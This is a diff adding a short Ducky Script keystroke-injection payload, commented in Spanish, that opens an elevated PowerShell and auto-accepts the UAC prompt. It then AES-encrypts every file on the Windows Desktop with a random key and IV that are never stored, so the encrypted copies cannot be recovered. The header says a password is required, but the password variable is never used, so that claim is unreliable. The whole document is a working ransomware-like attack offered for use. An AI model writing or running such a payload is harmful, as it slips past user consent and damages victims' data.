@@ -1,0 +1,26 @@
+# Encripta el escritorio de Windows. Requiere PASSWORD. Script creado por Sergigm87
+DELAY 1000
+REM Abre PowerShell como administrador
+WINDOWS r
+DELAY 800
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1000
+REM Aceptar el cuadro de diálogo UAC
+ALT y
+DELAY 800
+
+REM Define la contraseña y el algoritmo de cifrado
+STRING $password = '4qql3'; $AESKey = (New-Object System.Security.Cryptography.AesManaged).Key; $AesIV = (New-Object System.Security.Cryptography.AesManaged).IV;
+ENTER
+DELAY 800
+
+REM Cifra cada archivo en el escritorio
+STRING Get-ChildItem "$env:USERPROFILE\Desktop\*" -File | ForEach-Object { $bytes = Get-Content $_.FullName -Encoding Byte; $EncryptedBytes = (New-Object System.Security.Cryptography.AesManaged).CreateEncryptor($AESKey, $AesIV).TransformFinalBlock($bytes, 0, $bytes.Length); Set-Content "$($_.FullName).aes" -Value $EncryptedBytes -Encoding Byte }
+ENTER
+DELAY 800
+
+REM Cierra PowerShell
+STRING exit
+ENTER
+
